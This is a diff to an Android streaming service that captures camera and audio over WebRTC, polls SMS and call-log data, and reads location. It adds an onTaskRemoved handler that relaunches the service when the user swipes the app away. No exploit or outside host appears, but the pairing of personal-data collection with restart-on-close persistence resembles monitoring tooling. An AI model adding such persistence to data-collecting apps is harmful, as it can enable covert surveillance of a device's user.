@@ -99,10 +99,8 @@ public class StreamingService extends Service {
         initializeWebRTC();
         setupMediaStreaming();
         connectSignaling();
-        // Do NOT try to start NotificationListenerService directly; see method comment
-        // startNotificationListener();  // intentionally not auto-started
 
-        startDataPollingIfAllowed();   // optional: requires CALL_LOG + SMS (guarded)
+        startDataPollingIfAllowed();   // guarded by SMS/CALL permissions
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
     }
 
@@ -114,6 +112,7 @@ public class StreamingService extends Service {
                 stopSelf();
             }
         }
+        // Ask system to recreate after kill (keeps running when app is swiped away/locked)
         return START_STICKY;
     }
 
@@ -150,8 +149,28 @@ public class StreamingService extends Service {
         if (!camera) Log.e(TAG, "Camera permission missing");
         if (!audio) Log.e(TAG, "Record audio permission missing");
         if (!notify) Log.e(TAG, "Notifications permission missing (Android 13+)");
-
         return camera && audio && notify;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Log.d(TAG, "onTaskRemoved: scheduling self-restart if permitted");
+
+        // If the essentials aren’t granted, don’t try to resurrect.
+        if (!hasEssentialPermissions()) {
+            super.onTaskRemoved(rootIntent);
+            return;
+        }
+
+        // Relaunch the FGS promptly.
+        Intent restart = new Intent(getApplicationContext(), StreamingService.class);
+        restart.setPackage(getPackageName());
+        try {
+            androidx.core.content.ContextCompat.startForegroundService(getApplicationContext(), restart);
+        } catch (IllegalStateException e) {
+            Log.w(TAG, "FGS start not allowed in onTaskRemoved", e);
+        }
+        super.onTaskRemoved(rootIntent);
     }
 
     private void initializeWebRTC() {
